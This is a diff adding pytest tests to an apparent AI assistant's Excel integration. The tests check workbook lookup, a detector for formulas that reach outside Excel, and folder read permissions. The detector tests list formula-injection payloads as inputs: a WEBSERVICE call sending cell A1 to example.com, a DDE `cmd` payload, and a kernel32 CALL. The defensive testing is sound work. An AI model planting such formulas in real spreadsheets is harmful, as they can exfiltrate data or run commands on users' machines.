@@ -898,6 +898,55 @@ def test_a_name_with_a_dot_never_picks_another_workbook():
     with pytest.raises(W.Refusal, match="not open in Excel now"):
         W._find_book([_App(other)], "C:\\w\\Budget.xlsx", exact=True)
     assert W._find_book([_App(other, plain)], "c:\\W\\budget.xlsx", exact=True)[1] is plain
+    # A change made in a workbook never saved (Book1) is not put back into a
+    # SAVED Book1.xlsx that happens to be open later.
+    saved = _Book("Book1.xlsx", "D:\\other")
+    assert W._find_book([_App(saved)], "Book1")[1] is saved, "by name, for a look or a change"
+    with pytest.raises(W.Refusal, match="not open in Excel now"):
+        W._find_book([_App(saved)], "Book1", exact=True)
+
+
+@pytest.mark.parametrize("entry", [
+    '=WEBSERVICE("https://example.com/?d="&A1)', '=LEN(webservice(B2))', '+WEBSERVICE("http://x")', "=cmd|' /C calc'!A0",
+    "=1+MSEXCEL|'\\..\\x'!A1", '=IMAGE("https://example.com/a.png")', "='https://example.com/[b.xlsx]S'!A1",
+    "='\\\\host\\share\\[b.xlsx]S'!A1", '=RTD("x.y",,"a")', '=CALL("kernel32","Beep","JJJ",1,1)', "@WEBSERVICE(A1)",
+])
+def test_an_entry_that_makes_excel_reach_outside_is_spotted(entry):
+    assert W.reaches_out(entry) != ""
+
+
+@pytest.mark.parametrize("entry", [
+    "=SUM(A1:A9)", '=HYPERLINK("https://example.com","site")', '="see https://example.com|now"', "https://example.com", "- revenue | cost",
+    "=A1&\"|\"&B1", "=Table1[Amount]*2", "='C:\\Books\\[Other.xlsx]Sheet1'!A1", "=[Other.xlsx]Sheet1!A1", "-5", "", None, 12, "=IMAGINE", "=RECALL(1)",
+])
+def test_ordinary_entries_are_not_called_outside_calls(entry):
+    assert W.reaches_out(entry) == ""
+
+
+def test_the_outside_check_is_linear_on_a_long_formula():
+    start = time.perf_counter()
+    for text in ("=" + '"' * 200_000, "=" + "A|" * 100_000, "=" + "WEBSERVICE " * 50_000, "=" + "\\" * 200_000, "=" + "x(" * 100_000):
+        W.reaches_out(text)
+    assert time.perf_counter() - start < 2.0
+
+
+async def test_a_file_tool_never_reads_an_open_workbook_from_a_folder_jarvis_may_not_read(tmp_path, monkeypatch):
+    """The copy for a `live:` path (and for the map) is made first and judged
+    by where the workbook is open FROM; a refused one is removed again."""
+    private = str(tmp_path / "private" / "Payroll.xlsx")
+
+    def child(request, timeout):
+        out = Path(request["dir"]) / "Payroll.xlsx"
+        out.write_bytes(b"client data")
+        return {"ok": True, "path": str(out), "workbook": "Payroll.xlsx", "source": private, "saved": True}
+
+    monkeypatch.setattr(L, "_ask_worker", child)
+    monkeypatch.setattr("iron_jarvis.core.fs_policy.fs_read_ok", lambda p: (False, "That folder isn't one Jarvis may read."))
+    got, why = await L.live_path("live:Payroll.xlsx", _ctx(tmp_path))
+    assert got == "" and why == "That folder isn't one Jarvis may read."
+    res = await L.ExcelLiveLookTool().execute({"map": True, "workbook": "Payroll.xlsx"}, _ctx(tmp_path))
+    assert not res.ok and "isn't one Jarvis may read" in res.error
+    assert not any((tmp_path / "excel-live" / "snap").iterdir()), "no copy of it is left behind"
 
 
 def test_a_rollback_excel_was_too_busy_for_is_never_reported_as_nothing_changed(monkeypatch, tmp_path):
